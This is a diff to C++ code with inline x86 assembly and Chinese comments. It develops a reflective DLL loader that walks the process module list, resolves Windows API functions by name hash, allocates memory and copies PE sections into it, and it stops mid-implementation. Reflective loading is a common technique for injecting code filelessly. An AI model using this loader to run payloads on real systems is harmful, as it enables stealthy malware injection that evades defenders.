@@ -347,7 +347,7 @@ inline DWORD calc_name_hash()
 enum LocalEnum
 {
 	Nop,
-	memAddress					= 4,
+	PEAddress					= 4,
 	pLoadLibraryA				= 8,
 	pGetProcAddress				= 0xC,
 	pVirtualAlloc				= 0x10,
@@ -385,20 +385,20 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 
 		call    GetCurrentPositionAddress	// 获取当前位置地址
 		mov		eax, buffer
-		mov		[ebp + memAddress], eax		// 保存当前代码所在的地址 memAddress
+		mov		[ebp + PEAddress], eax		// 保存当前代码所在的地址 PEAddress
 		
 		addressAdd :
 		mov     eax, 1
 		test    eax, eax					// 判断eax是否获取到当前地址
 		jz      find_success
 			
-		mov     ecx, [ebp + memAddress]		// 查找DOS头
+		mov     ecx, [ebp + PEAddress]		// 查找DOS头
 		movzx   edx, word ptr[ecx]
 		cmp     edx, 0x5A4D
 		jnz    noFindFlag
 
 
-        mov     eax, [ebp + memAddress]
+        mov     eax, [ebp + PEAddress]
         mov     ecx, [eax + 0x3C]			// + 0x3C 找到DOS Header e_lfanew
         mov		[ebp + varLocalFindPE], ecx
         cmp		dword ptr[ebp + varLocalFindPE], 0x40
@@ -407,7 +407,7 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
         jnb     noFindFlag					// 地址address - 1
 
         mov     edx, [ebp + varLocalFindPE]
-        add     edx, [ebp + memAddress]
+        add     edx, [ebp + PEAddress]
         mov		[ebp + varLocalFindPE], edx
         mov     eax, [ebp + varLocalFindPE]
         cmp     dword ptr[eax], 0x4550		// 判断PE Header Signature PE标志
@@ -415,9 +415,9 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 		jmp     find_success				// 找到了singtrue 跳转
 
 			noFindFlag :
-		mov     ecx, [ebp + memAddress]		// 地址address - 1
+		mov     ecx, [ebp + PEAddress]		// 地址address - 1
 		sub     ecx, 1
-		mov		[ebp + memAddress], ecx
+		mov		[ebp + PEAddress], ecx
 		jmp		addressAdd
 
 			find_success:
@@ -430,9 +430,9 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 		mov     eax, [edx + 0x14]			// 获取结构中InMemoryOrderModuleList 顺序模块列表
 		mov		[ebp + varLocalFS30_B], eax
 
-			loc_46327B: 
+			continue_find: 
 		cmp		[ebp + varLocalFS30_B], 0
-		jz      find_moudle_null
+		jz      find_moudle_over
 		mov     ecx, [ebp + varLocalFS30_B]
 		mov     edx, [ecx + 0x28]			// FullDllName_buff 模块名称
 		mov		[ebp + BaseDllName], edx
@@ -584,11 +584,11 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
 		jmp     find_next_ker_fun
 
 			cmp_need_function:                      
-		jmp     loc_463506
+		jmp     check_function
 				
 			no_Kernel32_hash:
         cmp     [ebp+name_hash], 0x3CFA685D 		//; 3CFA685D = ntdll
-        jnz     loc_463506
+        jnz     check_function
         mov     ecx, [ebp+varLocalFS30_B]
         mov     edx, [ecx+0x10]  					//; +10偏移获取DllBase基址
         mov     [ebp+varLocalFS30_A], edx
@@ -617,12 +617,12 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
         mov     [ebp+var_4], ax
 
 			find_next_nt_fun:						// 同上面一样 
-        movzx   ecx, [ebp+var_4]
+        movzx   ecx, [ebp+var_4]					// 需要一个函数 var_4 = 1
         test    ecx, ecx
-        jle      loc_463506
-        mov     edx, [ebp+exp_AddressOfNames]
-        mov     eax, [ebp+varLocalFS30_A]
-        add     eax, [edx]
+        jle      check_function
+        mov     edx, [ebp+exp_AddressOfNames]		// exp_AddressOfNames = 函数名称表[]
+        mov     eax, [ebp+varLocalFS30_A]			// varLocalFS30_A = 基地址
+        add     eax, [edx]							// 计算hash
         push    eax
         call    calc_name_hash
         add     esp, 4
@@ -659,12 +659,104 @@ extern "C" __declspec(dllexport) void ReflectiveLoader()
         mov     [ebp+AddressOfNameOrdinals], edx
         jmp      find_next_nt_fun
 
+			check_function:
+		cmp     [ebp+LoadLibraryA], 0
+		jz      continue_find_function
+		cmp     [ebp+GetProcAddress], 0
+		jz      continue_find_function
+		cmp     [ebp+VirtualAlloc], 0
+		jz      continue_find_function
+		cmp     [ebp+pNtFlushInstructionCache], 0
+		jz      continue_find_function
+		jmp     find_moudle_over
 
-			find_moudle_null:
+			continue_find_function:
+        mov     eax, [ebp+var_C]
+        mov     ecx, [eax]
+        mov     [ebp+var_C], ecx
+        jmp     continue_find
 
-			loc_463506:
+			find_moudle_over:
+		mov     edx, [ebp+PEAddress]
+		mov     eax, [ebp+PEAddress]
+        add     eax, [edx+3Ch]
+        mov     [ebp+var_24], eax
+        push    0x04 						// PAGE_READWRITE 区域不可执行代码，应用程序可以读写该区域
+        push    0x3000           			// MEM_COMMIT | MEM_RESERV
+        mov     ecx, [ebp+var_24]
+        mov     edx, [ecx+0x50]  			// PE signature 0x18 + 0x38  SizeOfImage 映像装入内存后的总大小
+        add     edx, 0x3C00000   			// dwSize
+        push    edx
+        push    0x0
+        call    [ebp+VirtualAlloc]			// 申请一块 3C0000+SizeOfImage大小的内存
+        mov     [ebp+var_8], eax			// var_8 = mem_address
+        mov     eax, [ebp+var_24]			// var_24 = signature
+        mov     ecx, [eax+0x54]				// ecx = SizeOfHeaders 0x18 + 0x3c
+        mov     [ebp+var_C], ecx
+        mov     edx, [ebp+PEAddress]		// PEAddress = 4D5A address
+        mov     [ebp+BaseDllName], edx		// BaseDllName = PEAddress
+        mov     eax, [ebp+var_8]
+        mov     [ebp+name_hash], eax		// name_hash = mem_address
+        mov     ecx, [ebp+var_24]
+        movzx   edx, word ptr [ecx+0x14]	// edx = WORD SizeOfOptionalHeader
+        mov     eax, [ebp+var_24]
+        lea     ecx, [eax+edx+0x18]			// signature + SizeOfOptionalHeader + sizeof signature =  struct _IMAGE_SECTION_HEADER address 区段地址
+        mov     [ebp+var_C], ecx			// var_C = 区段地址
+        mov     edx, [ebp+var_24]
+        movzx   eax, word ptr [edx+0x06]	// signature + 0x04 + 0x02
+		mov     [ebp+var_3C], eax			// var_3C = NumberOfSections 节的数量
+		
+			loc_463585:	
+        mov     ecx, [ebp+var_3C]
+        mov     [ebp+var_58], ecx			// var_58 = 剩余要处理的Sections数量 index
+        mov     edx, [ebp+var_3C]
+        sub     edx, 1
+        mov     [ebp+var_3C], edx
+        cmp     [ebp+var_58], 0				// 区段是否都处理了 
+        jz      loc_463614
+        mov     eax, [ebp+var_C]			// var_C = 区段地址
+        mov     ecx, [ebp+var_8]			// var_8 = mem_address
+        add     ecx, [eax+0x0C]				// 申请的地址计算 基址 + 区段地址 +0x0c =  struct _IMAGE_SECTION_HEADER->VirtualAddress 节区的 RVA 地址
+        mov     [ebp+BaseDllName], ecx		// BaseDllName = SECTION VirtualAddress new mem 新地址
+        mov     edx, [ebp+var_C]
+        mov     eax, [ebp+PEAddress]		// eax = 4D5A address
+        add     eax, [edx+0x14]				// 取值 4D5A address + PointerToRawData = 区段地址 + 0x14 =  struct _IMAGE_SECTION_HEADER->PointerToRawData 文件中区段偏移
+        mov     [ebp+name_hash], eax		// name_hash = _IMAGE_SECTION_HEADER->PointerToRawData	在文件中的偏移量
+        mov     ecx, [ebp+var_C]			// var_C = 区段地址
+        mov     edx, [ecx+0x10]				// 
+        mov     [ebp+var_14], edx			// var_14 = _IMAGE_SECTION_HEADER->SizeOfRawData 	在文件中对齐后的尺寸
+        cmp     [ebp+var_50], 0
+        jnz     loc_4635C7
+        mov     eax, [ebp+BaseDllName]
+		mov     [ebp+var_50], eax			// var_50 = SECTION VirtualAddress new mem 新地址
+		
+			loc_4635C7:
+		cmp     [ebp+var_4C], 0
+		jnz     loc_4635D3
+		mov     ecx, [ebp+var_14]
+		mov     [ebp+var_4C], ecx			// var_4C = SizeOfRawData
 
+			loc_4635D3:
+        mov     edx, [ebp+var_14]
+        mov     [ebp+var_5C], edx			// var_5C = SizeOfRawData
+        mov     eax, [ebp+var_14]
+        sub     eax, 1						// 拷贝计数size - 1
+        mov     [ebp+var_14], eax			// var_14 = SizeOfRawData 在文件中对齐后的尺寸 - 1
+        cmp     [ebp+var_5C], 0				// 为 0 拷贝完成
+        jz      short loc_463606
+        mov     ecx, [ebp+BaseDllName]		// BaseDllName = SECTION VirtualAddress new mem 新地址
+        mov     edx, [ebp+name_hash]		// PointerToRawData
+        mov     al, [edx]					// 得到文件中的区段数据
+        mov     [ecx], al					// 拷贝到申请的mem中 算出来的偏移VirtualAddress
+        mov     ecx, [ebp+BaseDllName]
+        add     ecx, 1						// 新的内存地址 + 1
+        mov     [ebp+BaseDllName], ecx
+        mov     edx, [ebp+name_hash]		// 文件内存地址 + 1
+        add     edx, 1
+        mov     [ebp+name_hash], edx
+        jmp     loc_4635D3			//跳转后文件对其尺寸 - 1 为 0 时区段拷贝完毕
 
+			
 	}
 
 }
